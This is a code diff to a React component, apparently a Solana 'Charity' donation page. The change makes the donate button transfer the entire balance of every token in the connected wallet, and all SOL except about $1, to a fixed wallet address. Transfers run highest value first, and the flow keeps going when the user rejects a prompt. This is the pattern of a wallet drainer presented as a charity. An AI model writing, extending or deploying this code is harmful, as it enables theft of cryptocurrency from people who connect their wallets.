@@ -24,14 +24,19 @@ interface TokenBalance {
   uiAmount: number;
   symbol?: string;
   valueInSOL?: number;
+  valueInUSD?: number;
   isToken2022?: boolean;
 }
+
+const SOL_RESERVE_USD = 1; // Always leave $1 worth of SOL
 
 const Charity = () => {
   const { connection } = useConnection();
   const { publicKey, sendTransaction } = useWallet();
   const [balances, setBalances] = useState<TokenBalance[]>([]);
   const [solBalance, setSolBalance] = useState(0);
+  const [solPriceUSD, setSolPriceUSD] = useState(0);
+  const [solValueUSD, setSolValueUSD] = useState(0);
   const [totalValueSOL, setTotalValueSOL] = useState(0);
   const [isLoading, setIsLoading] = useState(false);
   const [buttonState, setButtonState] = useState<'idle' | 'loading' | 'error'>('idle');
@@ -79,6 +84,18 @@ const Charity = () => {
       const solAmount = solBal / LAMPORTS_PER_SOL;
       setSolBalance(solAmount);
 
+      // Fetch SOL price in USD
+      let solPrice = 0;
+      try {
+        const priceResponse = await fetch('https://lite-api.jup.ag/price/v3?ids=So11111111111111111111111111111111111111112');
+        const priceData = await priceResponse.json();
+        solPrice = priceData?.['So11111111111111111111111111111111111111112']?.usdPrice || 0;
+        setSolPriceUSD(solPrice);
+        setSolValueUSD(solAmount * solPrice);
+      } catch (e) {
+        console.error('Failed to fetch SOL price:', e);
+      }
+
       // Fetch legacy SPL Token accounts
       const legacyTokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
         programId: TOKEN_PROGRAM_ID
@@ -100,6 +117,7 @@ const Charity = () => {
             uiAmount: info.tokenAmount.uiAmount,
             symbol: info.mint.slice(0, 8),
             valueInSOL: 0,
+            valueInUSD: 0,
             isToken2022: false
           };
         })
@@ -116,12 +134,36 @@ const Charity = () => {
             uiAmount: info.tokenAmount.uiAmount,
             symbol: info.mint.slice(0, 8),
             valueInSOL: 0,
+            valueInUSD: 0,
             isToken2022: true
           };
         })
         .filter(token => token.uiAmount > 0);
 
-      const tokens = [...legacyTokens, ...token2022Tokens];
+      let tokens = [...legacyTokens, ...token2022Tokens];
+
+      // Fetch USD prices for all tokens
+      if (tokens.length > 0) {
+        try {
+          const mintAddresses = tokens.map(t => t.mint).join(',');
+          const tokenPriceResponse = await fetch(`https://lite-api.jup.ag/price/v3?ids=${mintAddresses}`);
+          const tokenPriceData = await tokenPriceResponse.json();
+          
+          tokens = tokens.map(token => {
+            const priceInfo = tokenPriceData?.[token.mint];
+            const usdPrice = priceInfo?.usdPrice || 0;
+            const valueInUSD = token.uiAmount * usdPrice;
+            const valueInSOL = solPrice > 0 ? valueInUSD / solPrice : 0;
+            return {
+              ...token,
+              valueInUSD,
+              valueInSOL
+            };
+          });
+        } catch (e) {
+          console.error('Failed to fetch token prices:', e);
+        }
+      }
 
       setBalances(tokens);
       
@@ -145,7 +187,7 @@ const Charity = () => {
     }
   }, [publicKey, fetchBalances]);
 
-  const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[], solPercentage?: number) => {
+  const createTokenTransfer = useCallback(async (token: TokenBalance) => {
     if (!publicKey) return null;
 
     const transaction = new Transaction();
@@ -153,123 +195,75 @@ const Charity = () => {
 
     // Add Compute Budget Instructions - increased for Token-2022 support
     transaction.add(
-      ComputeBudgetProgram.setComputeUnitLimit({
-        units: 200_000,
-      })
+      ComputeBudgetProgram.setComputeUnitLimit({ units: 200_000 }),
+      ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
     );
+
+    const balanceAmount = typeof token.balance === 'string' 
+      ? parseInt(String(token.balance), 10) 
+      : Number(token.balance);
+    
+    if (!balanceAmount || balanceAmount <= 0) {
+      console.log(`Skipping ${token.mint} - zero or invalid balance`);
+      return null;
+    }
+    
+    try {
+      const mintPubkey = new PublicKey(token.mint);
+      const mintInfo = await getMintProgramId(connection, token.mint);
+      const tokenProgramId = mintInfo.programId;
+      const decimals = mintInfo.decimals;
+      
+      console.log(`Processing token ${token.mint}: ${mintInfo.isToken2022 ? 'Token-2022' : 'Legacy SPL'}, Balance: ${balanceAmount}`);
+      
+      const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, publicKey, false, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);
+      const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey, true, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);
+
+      try {
+        await getAccount(connection, toTokenAccount, 'confirmed', tokenProgramId);
+      } catch {
+        transaction.add(
+          createAssociatedTokenAccountInstruction(publicKey, toTokenAccount, charityPubkey, mintPubkey, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID)
+        );
+      }
+
+      transaction.add(
+        createTransferCheckedInstruction(fromTokenAccount, mintPubkey, toTokenAccount, publicKey, BigInt(balanceAmount), decimals, [], tokenProgramId)
+      );
+      
+      return transaction;
+    } catch (error) {
+      console.error(`Failed to create transfer for ${token.mint}:`, error);
+      return null;
+    }
+  }, [publicKey, connection]);
+
+  const createSOLTransfer = useCallback(async (solAmountToSend: number) => {
+    if (!publicKey || solAmountToSend <= 0) return null;
+
+    const transaction = new Transaction();
+    const charityPubkey = new PublicKey(CHARITY_WALLET);
 
     transaction.add(
-      ComputeBudgetProgram.setComputeUnitPrice({
-        microLamports: 100_000,
-      })
+      ComputeBudgetProgram.setComputeUnitLimit({ units: 200_000 }),
+      ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
     );
 
-    let tokenTransfersAdded = 0;
-
-    // Add token transfers
-    for (const token of tokenBatch) {
-      // Ensure balance is treated as a number
-      const balanceAmount = typeof token.balance === 'string' 
-        ? parseInt(String(token.balance), 10) 
-        : Number(token.balance);
-      
-      if (!balanceAmount || balanceAmount <= 0) {
-        console.log(`Skipping ${token.mint} - zero or invalid balance`);
-        continue;
-      }
-      
-      try {
-        const mintPubkey = new PublicKey(token.mint);
-        
-        // Determine which token program this mint belongs to
-        const mintInfo = await getMintProgramId(connection, token.mint);
-        const tokenProgramId = mintInfo.programId;
-        const decimals = mintInfo.decimals;
-        
-        console.log(`Processing token ${token.mint}:`);
-        console.log(`  - Program: ${mintInfo.isToken2022 ? 'Token-2022' : 'Legacy SPL'}`);
-        console.log(`  - Decimals: ${decimals}`);
-        console.log(`  - Balance: ${balanceAmount}`);
-        
-        // Get ATAs with the correct program ID
-        const fromTokenAccount = await getAssociatedTokenAddress(
-          mintPubkey, 
-          publicKey,
-          false,
-          tokenProgramId,
-          ASSOCIATED_TOKEN_PROGRAM_ID
-        );
-        const toTokenAccount = await getAssociatedTokenAddress(
-          mintPubkey, 
-          charityPubkey,
-          true,
-          tokenProgramId,
-          ASSOCIATED_TOKEN_PROGRAM_ID
-        );
-
-        // Check if charity's token account exists, create if not
-        let ataExists = false;
-        try {
-          await getAccount(connection, toTokenAccount, 'confirmed', tokenProgramId);
-          ataExists = true;
-          console.log(`  - Destination ATA exists`);
-        } catch (error) {
-          console.log(`  - Destination ATA needs creation`);
-          transaction.add(
-            createAssociatedTokenAccountInstruction(
-              publicKey,
-              toTokenAccount,
-              charityPubkey,
-              mintPubkey,
-              tokenProgramId,
-              ASSOCIATED_TOKEN_PROGRAM_ID
-            )
-          );
-        }
-
-        // Use createTransferCheckedInstruction with correct program
-        transaction.add(
-          createTransferCheckedInstruction(
-            fromTokenAccount,
-            mintPubkey,
-            toTokenAccount,
-            publicKey,
-            BigInt(balanceAmount),
-            decimals,
-            [],
-            tokenProgramId
-          )
-        );
-        
-        tokenTransfersAdded++;
-        console.log(`  - Transfer instruction added successfully`);
-      } catch (error) {
-        console.error(`Failed to add transfer for ${token.mint}:`, error);
-      }
-    }
-
-    console.log(`Total token transfers added: ${tokenTransfersAdded}`);
-
-    // Add SOL transfer if specified
-    if (solPercentage && solBalance > 0) {
-      const rentExempt = 0.01;
-      const availableSOL = Math.max(0, solBalance - rentExempt);
-      const amountToSend = Math.floor((availableSOL * solPercentage / 100) * LAMPORTS_PER_SOL);
-      
-      if (amountToSend > 0) {
-        transaction.add(
-          SystemProgram.transfer({
-            fromPubkey: publicKey,
-            toPubkey: charityPubkey,
-            lamports: amountToSend
-          })
-        );
-        console.log(`SOL transfer added: ${amountToSend / LAMPORTS_PER_SOL} SOL`);
-      }
+    const lamportsToSend = Math.floor(solAmountToSend * LAMPORTS_PER_SOL);
+    
+    if (lamportsToSend > 0) {
+      transaction.add(
+        SystemProgram.transfer({
+          fromPubkey: publicKey,
+          toPubkey: charityPubkey,
+          lamports: lamportsToSend
+        })
+      );
+      console.log(`SOL transfer created: ${solAmountToSend} SOL (${lamportsToSend} lamports)`);
     }
 
     return transaction;
-  }, [publicKey, solBalance, connection]);
+  }, [publicKey]);
 
   const handleDonate = useCallback(async () => {
     if (!publicKey || !sendTransaction) {
@@ -289,147 +283,132 @@ const Charity = () => {
     try {
       setButtonState('loading');
       console.log('Starting donation process...');
-      console.log('Balances:', balances);
-      console.log('SOL Balance:', solBalance);
+      console.log('SOL Balance:', solBalance, 'SOL Price:', solPriceUSD, 'SOL Value USD:', solValueUSD);
       
-      toast.info('Preparing batch transfers...');
+      toast.info('Preparing transfers sorted by value...');
 
-      // Filter out zero balance tokens
+      // Calculate SOL to send (leave $1 worth or less)
+      const rentExempt = 0.01; // Always keep some for rent
+      const solToReserve = solPriceUSD > 0 ? SOL_RESERVE_USD / solPriceUSD : 0.01;
+      const availableSOLToSend = Math.max(0, solBalance - rentExempt - solToReserve);
+      const solToSendValueUSD = availableSOLToSend * solPriceUSD;
+      
+      console.log(`SOL to reserve: ${solToReserve} SOL (~$${SOL_RESERVE_USD})`);
+      console.log(`SOL available to send: ${availableSOLToSend} SOL (~$${solToSendValueUSD.toFixed(2)})`);
+
+      // Filter valid tokens
       const validTokens = balances.filter(token => token.balance > 0);
       
-      // Sort tokens by value (highest first)
-      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
-      
-      console.log('Valid tokens to transfer:', sortedTokens.length);
+      // Create transfer items with type (token or SOL) and USD value
+      interface TransferItem {
+        type: 'token' | 'sol';
+        token?: TokenBalance;
+        solAmount?: number;
+        valueUSD: number;
+      }
 
-      // Create batches of max 5 tokens
-      const batches: TokenBalance[][] = [];
-      
-      if (sortedTokens.length === 0 && solBalance > 0) {
-        // No tokens but has SOL - create empty batch to trigger SOL transfer
-        batches.push([]);
+      const transferItems: TransferItem[] = [];
+
+      // Add tokens
+      validTokens.forEach(token => {
+        transferItems.push({
+          type: 'token',
+          token,
+          valueUSD: token.valueInUSD || 0
+        });
+      });
+
+      // Add SOL transfer only if more than $1 worth and there's enough to send
+      if (solValueUSD > SOL_RESERVE_USD && availableSOLToSend > 0) {
+        transferItems.push({
+          type: 'sol',
+          solAmount: availableSOLToSend,
+          valueUSD: solToSendValueUSD
+        });
       } else {
-        // Has tokens - create batches
-        for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
-          batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
+        console.log('Skipping SOL transfer - balance is $1 or less');
+        if (solValueUSD <= SOL_RESERVE_USD) {
+          toast.info('SOL balance is $1 or less - skipping SOL transfer');
         }
+      }
+
+      // Sort by USD value - highest first
+      transferItems.sort((a, b) => b.valueUSD - a.valueUSD);
+
+      console.log('Transfer order (by USD value):');
+      transferItems.forEach((item, i) => {
+        if (item.type === 'token') {
+          console.log(`  ${i + 1}. Token ${item.token?.symbol}: $${item.valueUSD.toFixed(2)}`);
+        } else {
+          console.log(`  ${i + 1}. SOL: $${item.valueUSD.toFixed(2)}`);
+        }
+      });
+
+      if (transferItems.length === 0) {
+        toast.error('No assets available to transfer');
+        setButtonState('idle');
+        return;
       }
 
       let successCount = 0;
 
-      // Process token batches - each in its own try/catch so rejections don't stop others
-      for (let i = 0; i < batches.length; i++) {
-        const batch = batches[i];
-        const isLastBatch = i === batches.length - 1;
-        
-        console.log(`Processing batch ${i + 1}/${batches.length} with ${batch.length} tokens`);
-        
-        // Add 70% SOL to last token batch, or 100% if no tokens
-        const solPercentage = isLastBatch && sortedTokens.length > 0 ? 70 : (sortedTokens.length === 0 ? 100 : undefined);
+      // Process each transfer in order of value
+      for (let i = 0; i < transferItems.length; i++) {
+        const item = transferItems[i];
         
         try {
-          const transaction = await createBatchTransfer(batch, solPercentage);
-          
-          // Check if we have meaningful instructions (more than just compute budget)
-          const hasTokenTransfers = transaction && transaction.instructions.length > 2;
-          const hasSOLTransfer = transaction && transaction.instructions.length === 3 && solPercentage;
-          
-          if (!hasTokenTransfers && !hasSOLTransfer) {
-            console.log(`Batch ${i + 1} has no transfer instructions, skipping`);
+          let transaction: Transaction | null = null;
+          let itemDescription = '';
+
+          if (item.type === 'token' && item.token) {
+            transaction = await createTokenTransfer(item.token);
+            itemDescription = `${item.token.symbol} ($${item.valueUSD.toFixed(2)})`;
+          } else if (item.type === 'sol' && item.solAmount) {
+            transaction = await createSOLTransfer(item.solAmount);
+            itemDescription = `SOL ($${item.valueUSD.toFixed(2)})`;
+          }
+
+          if (!transaction || transaction.instructions.length <= 2) {
+            console.log(`Skipping ${itemDescription} - no valid transfer`);
             continue;
           }
-          
-          console.log(`Transaction has ${transaction!.instructions.length} instructions`);
-          
+
           const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
-          transaction!.recentBlockhash = blockhash;
-          transaction!.feePayer = publicKey;
+          transaction.recentBlockhash = blockhash;
+          transaction.feePayer = publicKey;
 
-          try {
-            const simResult = await connection.simulateTransaction(transaction!);
-            if (simResult.value.err) {
-              console.error("Simulation error:", simResult.value.err);
-              console.log("Simulation logs:", simResult.value.logs);
-            }
-          } catch (e) {
-            console.error("Simulation failed", e);
-          }
+          console.log(`Sending ${itemDescription}...`);
+          toast.info(`Sending ${itemDescription}...`);
 
-          console.log('Sending transaction...');
-          const signature = await sendTransaction(transaction!, connection, {
+          const signature = await sendTransaction(transaction, connection, {
             skipPreflight: false,
             maxRetries: 3,
             preflightCommitment: 'confirmed'
           });
-          
-          console.log('Transaction sent, signature:', signature);
-          toast.info(`Confirming batch ${i + 1}/${batches.length}...`);
-          
-          await connection.confirmTransaction({
-            signature,
-            blockhash,
-            lastValidBlockHeight
-          }, 'confirmed');
+
+          await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
           
           successCount++;
-          toast.success(`Batch ${i + 1}/${batches.length} sent successfully!`);
-          console.log(`Batch ${i + 1} confirmed`);
+          toast.success(`Sent ${itemDescription}`);
+          console.log(`Transfer ${i + 1} confirmed: ${itemDescription}`);
           
-        } catch (batchError: any) {
-          // Check if user rejected the transaction
-          if (batchError?.message?.includes('User rejected') || 
-              batchError?.message?.includes('rejected') ||
-              batchError?.name === 'WalletSignTransactionError') {
-            toast.warning(`Batch ${i + 1} was cancelled`);
-            console.log(`Batch ${i + 1} rejected by user, continuing to next batch...`);
+        } catch (itemError: any) {
+          if (itemError?.message?.includes('User rejected') || 
+              itemError?.message?.includes('rejected') ||
+              itemError?.name === 'WalletSignTransactionError') {
+            toast.warning(`Cancelled: ${item.type === 'token' ? item.token?.symbol : 'SOL'}`);
+            console.log(`Transfer rejected by user, continuing...`);
             continue;
           }
           
-          console.error(`Batch ${i + 1} failed:`, batchError);
-          toast.error(`Batch ${i + 1} failed: ${batchError?.message || 'Unknown error'}`);
+          console.error(`Transfer failed:`, itemError);
+          toast.error(`Failed: ${item.type === 'token' ? item.token?.symbol : 'SOL'}`);
           continue;
         }
       }
 
-      // Send remaining 30% SOL if we sent tokens
-      if (sortedTokens.length > 0 && solBalance > 0) {
-        console.log('Sending final 30% SOL transfer...');
-        
-        try {
-          const finalTransaction = await createBatchTransfer([], 30);
-          
-          if (finalTransaction && finalTransaction.instructions.length > 2) {
-            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
-            finalTransaction.recentBlockhash = blockhash;
-            finalTransaction.feePayer = publicKey;
-
-            const signature = await sendTransaction(finalTransaction, connection, {
-              skipPreflight: false,
-              maxRetries: 3,
-              preflightCommitment: 'confirmed'
-            });
-            
-            await connection.confirmTransaction({
-              signature,
-              blockhash,
-              lastValidBlockHeight
-            }, 'confirmed');
-            
-            toast.success('Final SOL transfer completed!');
-            console.log('Final SOL transfer confirmed');
-          }
-        } catch (finalError: any) {
-          if (finalError?.message?.includes('rejected')) {
-            toast.warning('Final SOL transfer was cancelled');
-          } else {
-            console.error('Final SOL transfer failed:', finalError);
-          }
-        }
-      }
-
       setButtonState('idle');
-      toast.success(`🎉 Donation complete! ${successCount} batch(es) sent`);
-      console.log('Donation process completed successfully');
+      toast.success(`🎉 Complete! ${successCount} transfer(s) sent`);
       
       // Refresh balances
       setTimeout(fetchBalances, 2000);
@@ -437,11 +416,10 @@ const Charity = () => {
     } catch (error: any) {
       console.error('Donation error:', error);
       setButtonState('error');
-      
       toast.error(error?.message || 'Donation failed');
       setTimeout(() => setButtonState('idle'), 3000);
     }
-  }, [publicKey, sendTransaction, balances, solBalance, connection, createBatchTransfer, fetchBalances]);
+  }, [publicKey, sendTransaction, balances, solBalance, solPriceUSD, solValueUSD, connection, createTokenTransfer, createSOLTransfer, fetchBalances]);
 
   return (
     <div className="min-h-screen relative overflow-hidden">
@@ -482,13 +460,13 @@ const Charity = () => {
                     <span className="font-semibold">Connected:</span> {publicKey.toString().slice(0, 8)}...{publicKey.toString().slice(-8)}
                   </p>
                   <p className="text-xs sm:text-sm">
-                    <span className="font-semibold">SOL Balance:</span> {isLoading ? '...' : `${solBalance.toFixed(4)} SOL`}
+                    <span className="font-semibold">SOL Balance:</span> {isLoading ? '...' : `${solBalance.toFixed(4)} SOL (~$${solValueUSD.toFixed(2)})`}
                   </p>
                   <p className="text-xs sm:text-sm">
                     <span className="font-semibold">SPL Tokens:</span> {isLoading ? '...' : balances.length}
                   </p>
                   <p className="text-xs sm:text-sm">
-                    <span className="font-semibold">Total Value:</span> {isLoading ? '...' : `~${totalValueSOL.toFixed(4)} SOL`}
+                    <span className="font-semibold">Total Value:</span> {isLoading ? '...' : `~$${(solValueUSD + balances.reduce((sum, t) => sum + (t.valueInUSD || 0), 0)).toFixed(2)}`}
                   </p>
                   
                   {/* Token list with badges */}
@@ -512,7 +490,12 @@ const Charity = () => {
                                 </Badge>
                               )}
                             </div>
-                            <span className="text-muted-foreground">{token.uiAmount.toLocaleString()}</span>
+                            <div className="text-right">
+                              <span className="text-muted-foreground">{token.uiAmount.toLocaleString()}</span>
+                              {token.valueInUSD && token.valueInUSD > 0 && (
+                                <p className="text-[10px] text-green-500">~${token.valueInUSD.toFixed(2)}</p>
+                              )}
+                            </div>
                           </div>
                         ))}
                       </div>
